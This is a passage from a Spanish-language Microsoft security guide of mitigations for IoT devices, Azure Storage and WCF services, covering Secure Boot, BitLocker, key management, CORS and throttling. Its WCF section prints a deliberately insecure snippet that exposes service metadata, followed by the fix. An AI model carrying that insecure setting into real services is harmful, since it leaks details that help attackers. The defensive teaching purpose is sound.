| **Referencias**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) (Habilitación del arranque seguro y del cifrado de dispositivos de BitLocker en Windows 10 IoT Core) |
| **Pasos** | El arranque seguro de UEFI restringe el sistema para permitir solo la ejecución de archivos binarios firmados por una entidad determinada. Esta característica evita que se ejecute código desconocido en la plataforma y pueda debilitar su seguridad. Habilite el arranque seguro de UEFI y restrinja la lista de entidades emisoras de certificados de confianza para la firma de código. Firme todo el código que se implementa en el dispositivo a través de una de las entidades de confianza. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Cifrado del sistema operativo y particiones adicionales en los dispositivos IoT con Bitlocker

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | Windows 10 IoT Core implementa una versión ligera de cifrado de dispositivos de BitLocker, que depende en gran medida de la presencia de un TPM en la plataforma, incluido el protocolo preOS necesario en UEFI que toma las medidas necesarias. Estas medidas de preOS garantizan que el sistema operativo posterior tenga un registro definitivo de cómo se inició el sistema operativo. Cifre con Bitlocker las particiones del sistema operativo, así como cualquier partición adicional donde se almacenen datos confidenciales. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Comprobación de que solo se habilita el mínimo número de servicios o características en los dispositivos

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | No habilite ni active características o servicios en el sistema operativo que no sean necesarias para el funcionamiento de la solución. Por ejemplo, si el dispositivo no requiere la implementación de una interfaz de usuario, instale Windows IoT Core en modo "desatendido". |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Cifrado del sistema operativo y particiones adicionales en la puerta de enlace de campo de IoT con Bitlocker

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Puerta de enlace de campo de IoT | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | Windows 10 IoT Core implementa una versión ligera de cifrado de dispositivos de BitLocker, que depende en gran medida de la presencia de un TPM en la plataforma, incluido el protocolo preOS necesario en UEFI que toma las medidas necesarias. Estas medidas de preOS garantizan que el sistema operativo posterior tenga un registro definitivo de cómo se inició el sistema operativo. Cifre con Bitlocker las particiones del sistema operativo, así como cualquier partición adicional donde se almacenen datos confidenciales. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Comprobación de que las credenciales de inicio de sesión predeterminadas de la puerta de enlace de campo se modifican durante la instalación

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Puerta de enlace de campo de IoT | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | Comprobación de que las credenciales de inicio de sesión predeterminadas de la puerta de enlace de campo se modifican durante la instalación |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Comprobación de que la puerta de enlace de la nube implementa un proceso para mantener actualizado el firmware de los dispositivos conectados

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Puerta de enlace de la nube de IoT | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | Elección de puerta de enlace: Azure IoT Hub |
| **Referencias**              | [Introducción a la administración de dispositivos con IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Cómo actualizar firmware de dispositivo](../../iot-hub/tutorial-firmware-update.md) |
| **Pasos** | LWM2M es un protocolo de Open Mobile Alliance para la administración de dispositivos IoT. La administración de dispositivos IoT de Azure permite interactuar con dispositivos físicos mediante trabajos de dispositivo. Asegúrese de que la puerta de enlace de la nube implementa un proceso para mantener al día de forma rutinaria el dispositivo y otros datos de configuración mediante la administración de dispositivos de Azure IoT Hub. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Comprobación de que los dispositivos tienen controles de seguridad de punto de conexión configurados según las directivas organizativas

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Límite de confianza de la máquina | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | Asegúrese de que los controles de seguridad de punto de conexión de los dispositivos como Bitlocker para el cifrado a nivel de disco, antivirus con las firmas actualizadas, firewall basado en el host, actualizaciones de sistema operativo, directivas de grupo, etc. estén configurados según las directivas de seguridad. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Comprobación de la administración segura de las claves de acceso de almacenamiento de Azure

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Azure Storage | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [Guía de seguridad de Azure Storage: administración de las claves de la cuenta de almacenamiento](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Pasos** | <p>Almacenamiento de claves: se recomienda almacenar las claves de acceso de Azure Storage en Azure Key Vault como secreto y hacer que las aplicaciones recuperen la clave del almacén. Se recomienda esto por los siguientes motivos:</p><ul><li>La aplicación nunca tendrá la clave de almacenamiento codificada de manera rígida en un archivo de configuración, lo que elimina la posibilidad de que alguien acceda a las claves sin permiso específico</li><li>El acceso a las claves se controla con Azure Active Directory. Esto significa que el propietario de la cuenta puede conceder acceso a la serie de aplicaciones que necesitan recuperar las claves de Azure Key Vault. Las demás aplicaciones no podrán acceder a las claves si no se les concede específicamente el permiso</li><li>Regeneración de claves: por motivos de seguridad, se recomienda disponer de un proceso para volver a generar las claves de acceso de almacenamiento de Azure. Los detalles sobre por qué y cómo planear la regeneración de claves se documentan en el artículo de referencia de la Guía de seguridad de Azure Storage</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Comprobación de que solo se permiten orígenes de confianza si CORS está activado en Azure Storage

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Azure Storage | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [CORS Support for the Azure Storage Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) (Compatibilidad de CORS para los servicios de Azure Storage) |
| **Pasos** | Azure Storage permite habilitar el uso compartido de recursos entre orígenes. Puede especificar los dominios que pueden tener acceso a los recursos de cada una de las cuentas de almacenamiento. De forma predeterminada, el uso compartido de recursos entre orígenes está deshabilitado en todos los servicios. Puede habilitarlo mediante la API de REST o la biblioteca de clientes de Storage para llamar a uno de los métodos a fin de establecer las directivas del servicio. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Habilitación de la característica de limitación del servicio de WCF

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | .NET Framework 3 |
| **Atributos**              | N/D  |
| **Referencias**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Pasos** | <p>No limitar el uso de recursos del sistema podría provocar el agotamiento de estos y, en última instancia, la denegación del servicio.</p><ul><li>**EXPLICACIÓN:** Windows Communication Foundation (WCF) ofrece la posibilidad de limitar las solicitudes de servicio. Permitir demasiadas solicitudes de cliente puede superar al sistema y agotar sus recursos. Por otra parte, permitir solo un pequeño número de solicitudes a un servicio puede impedir que los usuarios legítimos lo usen. Cada servicio debe ajustarse y configurarse individualmente para permitir la cantidad adecuada de recursos.</li><li>**RECOMENDACIONES** Habilite la característica de limitación del servicio de WCF y establezca los límites adecuados para la aplicación.</li></ul>|

### <a name="example"></a>Ejemplo
El siguiente es un ejemplo de configuración con la limitación habilitada:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Revelación de información de WCF mediante metadatos

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | .NET Framework 3 |
| **Atributos**              | N/D  |
| **Referencias**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Pasos** | Los metadatos pueden ayudar a los atacantes a obtener información sobre el sistema y a planear la forma de ataque. Los servicios de WCF pueden configurarse para exponer los metadatos. Los metadatos proporcionan información descriptiva detallada del servicio y no se deben difundir en entornos de producción. Las propiedades `HttpGetEnabled` / `HttpsGetEnabled` de la clase de ServiceMetaData definen si un servicio va a exponer los metadatos | 

### <a name="example"></a>Ejemplo
El código siguiente indica a WCF que difunda los metadatos del servicio
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
En un entorno de producción no se difunden los metadatos del servicio. Establezca las propiedades HttpGetEnabled / HttpsGetEnabled de la clase ServiceMetaData en false. 

### <a name="example"></a>Ejemplo
El código siguiente indica a WCF que no difunda los metadatos del servicio. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
